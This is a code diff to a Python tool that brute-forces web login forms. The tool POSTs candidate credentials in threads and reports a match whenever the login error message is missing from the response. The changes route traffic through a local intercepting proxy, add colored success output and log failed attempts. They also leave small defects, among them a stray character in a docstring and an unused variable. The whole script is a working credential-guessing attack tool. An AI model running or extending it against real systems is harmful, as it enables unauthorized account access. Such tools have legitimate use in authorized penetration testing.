@@ -1,5 +1,6 @@
 import requests, re, sys, argparse, threading
 from itertools import islice
+from termcolor import colored
 
 
 DEFAULT_THREAD_NO = 10
@@ -9,7 +10,12 @@ ERR_FILEOPEN = 100
 
 thread_count = None
 args = None
-
+proxies = {
+	"http" : "http://127.0.0.1:8080",
+     	"https" : "https://127.0.0.1:8080",
+            }
+headers = {'Content-Type': 'application/x-www-form-urlencoded'
+           }
 
 """
 Parse required and optional program arguments.
@@ -36,7 +42,7 @@ def parse_arguments():
     args = parser.parse_args()
 
 
-"""
+"""a
 Craft POST request and send it; Check response body for login error message;
 If the message is not present then a match was found.
 """
@@ -44,16 +50,22 @@ def crack(pURL, pData):
     global args
     if args.verbose:
         print("[!] Attempting " + str(pData) + "\n")
+    pData = pData[:-1]
+    r = requests.post(url=pURL, data=pData,proxies=proxies,headers=headers)
 
-    r = requests.post(url=pURL, data=pData)
+    print (r.request)
+
+
     r.close()
-    print(r.request.body)
-    print(r.request.headers)
+
+    test = args.message
     reg = re.search(args.message, r.text)
 
     if reg is None:  # If the login error message is not read
-        print("[+] Found possible match: " + str(pData) + "\n")
+        print(colored('[+] Found possible match: ', 'green'),colored(str(pData)))
         exit(EXIT_SUCCESS)
+    else:
+        print("[!] Invalid creds - "+str(pData)+'\n')
 
     return
 
